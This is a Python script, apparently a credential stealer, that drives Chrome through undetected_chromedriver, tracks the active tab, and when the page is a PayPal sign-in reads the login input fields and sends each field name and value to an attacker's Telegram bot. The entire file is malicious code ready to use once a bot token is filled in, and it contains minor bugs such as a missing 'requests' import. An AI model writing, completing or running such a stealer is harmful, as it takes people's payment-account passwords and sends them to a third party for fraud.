import undetected_chromedriver as uc
import os, threading
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
from pathlib import Path

local_app_data_path = os.getenv('LOCALAPPDATA')
chrome_path = os.path.join(local_app_data_path, "Google", "Chrome", "User Data")
all_profiles = None
driver = None
on_domain = ""
on_domain_same = False
Events_Handler_Thread = True

bot_token = "YOUR_BOT_TOKEN_HERE"
chat_id = "YOUR CHAT ID (Example: -4232223)"
sent_values = []

def add_sent_value(domain, key, value):
    global sent_values
    sent_values.append({"domain": domain, "key": key, "value": value})

def get_sent_by_value(domain, value):
    global sent_values
    return list(filter(lambda x: x["domain"] == domain and x["value"] == value, sent_values))

def get_sent_values(domain):
    global sent_values
    return list(filter(lambda x: x["domain"] == domain, sent_values))

def get_sent_values_by_key(domain, key):
    global sent_values
    return list(filter(lambda x: x["domain"] == domain and x["key"] == key, sent_values))

def send_message(text: str, chat_id: str):
    global bot_token
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    payload = {'chat_id': chat_id, 'text': text}
    requests.post(url, data=payload)

def all_profiles_paths(browser_path):
    profiles = {"Default": os.path.join(browser_path, "Default")}
    for entry in Path(browser_path).iterdir():
        if entry.is_dir() and entry.name.startswith("Profile"):
            profiles[entry.name] = str(entry)
    return profiles

def chrome_driver_path():
    return ChromeDriverManager().install()

def set_current_active_tab(avoid_tab=[]):
    global all_profiles, driver, on_domain, on_domain_same, Events_Handler_Thread
    current_active_tab = driver.window_handles[-1]
    try:
        current_window_handle = driver.current_window_handle
    except:
        current_window_handle = None
    if current_active_tab != current_window_handle:
        driver.switch_to.window(current_active_tab)

def get_input_fields():
    global all_profiles, driver, on_domain, on_domain_same, Events_Handler_Thread
    input_elements = driver.find_elements(By.TAG_NAME, 'input')
    input_fields = {}
    for element in input_elements:
        name = element.get_attribute('name')
        value = element.get_attribute('value')
        input_fields[name] = value
    return input_fields

def events_handler():
    global all_profiles, driver, on_domain, on_domain_same, Events_Handler_Thread
    while Events_Handler_Thread:
        set_current_active_tab()
        if on_domain != driver.current_url:
            on_domain = driver.current_url
            on_domain_same = False
        else:
            on_domain_same = True
        if on_domain in ["about:blank", "about:srcdoc", "", None]:
            continue
        if not on_domain_same:
            print("[+] Current domain: " + on_domain)

def handler_thread():
    global all_profiles, driver, on_domain, on_domain_same, Events_Handler_Thread, sent_values
    while True:
        if "paypal.com/signin" in on_domain.lower():
            fields = get_input_fields()
            for key, value in fields.items():
                if value in [None, ""]:
                    continue
                send_message(text=f"{key}: {value}", chat_id=chat_id)
                add_sent_value("paypal.com", key, value)

def main():
    global all_profiles, driver, on_domain, on_domain_same, Events_Handler_Thread
    options = uc.ChromeOptions()
    driver = uc.Chrome(driver_executable_path=chrome_driver_path(), options=options)
    events_handler_thread = threading.Thread(target=events_handler)
    events_handler_thread.start()
    handler_thread()
    Events_Handler_Thread = False
    del driver

if __name__ == "__main__":
    main()
